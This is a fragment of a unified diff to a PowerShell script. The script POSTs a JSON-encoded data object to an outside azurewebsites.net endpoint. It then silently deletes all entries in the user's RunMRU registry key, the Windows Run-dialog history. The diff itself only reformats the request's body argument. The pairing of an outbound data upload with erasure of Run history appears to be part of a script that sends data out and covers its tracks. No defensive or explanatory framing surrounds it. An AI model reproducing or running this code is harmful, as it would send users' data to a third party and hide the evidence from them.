@@ -7,7 +7,7 @@ try {
 
     $body = ($data | ConvertTo-Json)
 
-    Invoke-WebRequest -Method Post -Uri "https://pjx.azurewebsites.net/api/pjx" -Body $body
+    Invoke-WebRequest -Method Post -Uri "https://pjx.azurewebsites.net/api/pjx" -Body ($data | ConvertTo-Json)
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 }
 catch {
